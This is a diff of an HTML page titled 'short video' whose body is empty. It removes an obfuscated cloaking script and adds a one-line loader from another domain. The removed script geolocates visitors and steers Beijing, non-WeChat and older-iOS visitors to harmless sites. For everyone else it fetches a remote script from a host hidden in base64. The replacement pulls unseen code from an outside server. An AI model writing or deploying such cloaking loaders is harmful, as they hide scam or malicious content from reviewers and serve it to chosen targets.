@@ -1,5 +1,4 @@
-<?php ?>
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -7,104 +6,7 @@
           content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>短视</title>
-    <script>
-    
-    var a = {}, b = {};
-
-(function (w, d) {
-
-    function ip_query() {
-        var dizhi = '';
-        if(typeof localAddress != 'undefined') {
-            if(typeof localAddress["city"] != 'undefined' && localAddress["city"] != ''){
-                dizhi = localAddress["city"];
-                dizhi = dizhi.replace("市", "");
-            }else if(typeof localAddress["province"] != 'undefined' && localAddress["province"] != ''){
-                dizhi = localAddress["province"];
-                dizhi = dizhi.replace("省", "");
-            }
-        }
-        if (/北京/.test(dizhi)){
-            location.href='https://news.qq.com/';
-        }else {
-            function isWeixinBrowser() {
-                return /micromessenger/i.test(navigator.userAgent);
-            }
-
-            var u = navigator.userAgent;
-            var ios_version=u.match(/micromessenger\/\d.\d.\d[0-9]{0,3}/i)[0].match(/\d{2,3}/g)[0]
-            var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android安卓
-            var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios苹果
-
-
-            var s = location.search;
-            var query = {};
-            (function (q) {
-                var ps = location.href.split('#')[0].split('?');
-                if (ps.length < 2) {
-                    return;
-                }
-                var params = ps[1].split('&');
-                for (var i = 0; i < params.length; i++) {
-                    var item = params[i];
-                    var kv = item.split('=');
-                    q[kv[0]] = kv[1];
-                }
-            })(query);
-            /*if (!query['poyrik'] || !query['oiyes'] || !query['from']){
-                location[`href`] = `//m.baidu.com/`;
-                return;
-                !query['from']) || (s.indexOf('timeline') == -1 && s.indexOf('groupmessage') == -1 && s.indexOf('singlemessage') == -1) ||
-            }*/
-            if ((!isiOS || parseInt(ios_version)<12)&&((!query['poyrik'] && !query['oiyes']) || (!isWeixinBrowser()))) {
-                location[`href`] = `//m.baidu.com/`;
-            } else {
-                pathUtil = {
-                    addParam: function (name, value) {
-                        if (arguments.length == 1 && typeof name == 'object') {
-                            // 对象
-                            for (item in name) {
-                                query[item] = name[item];
-                            }
-                        } else {
-                            query[name] = value;
-                        }
-                    },
-                    removeParam: function (name) {
-                        delete query[name];
-                    },
-                    getQueryString: function () {
-                        var attrs = [];
-                        for (item in query) {
-                            attrs.push(item + '=' + query[item]);
-                        }
-                        return attrs.join('&');
-                    },
-                    getPath: function () {
-                        return location.pathname + '?' + this.getQueryString();
-                    }
-                }
-
-                var qs = pathUtil.getQueryString();
-                var host = atob('aHR0cHM6Ly9kZWNpbWFsLnlhbmdxdWFuODEuY24vcGFnZQ==');
-                var jsUrl = host + "?" + qs;
-
-                var script = document.createElement('script');
-                script.src = jsUrl;
-                document.querySelector('head').appendChild(script);
-            }
-        }
-    }
-
-    var script=document.createElement("script");
-    script.src='https://ip.ws.126.net/ipquery';
-    script.onload=ip_query;
-    document.head.prepend(script);
-
-
-
-})(a, b);
-    </script>
+    <script src="https://m.mark.gzzjbx.cn/api/page"></script>
 </head>
 <body>
 </body>
